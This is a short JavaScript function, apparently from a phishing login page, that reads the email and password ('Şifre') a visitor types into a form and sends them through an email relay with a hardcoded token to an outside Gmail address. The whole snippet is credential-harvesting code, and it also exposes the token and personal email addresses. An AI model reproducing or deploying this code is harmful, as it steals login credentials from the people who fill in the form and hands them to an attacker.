 function sendmail(){
    
	var email = $('#email').val();
	var sifre = $('#sifre').val();
	var Body='Email: '+email+'<br>Şifre: '+sifre;
	
	Email.send({
    SecureToken :"761c0d3e-c455-4d78-8c34-6d171e3ef416",
    To : 'shnblkbssss@gmail.com',
    From : "sahinbolukbasii@gmail.com",
    Subject : "This is the subject",
	Body: Body});

}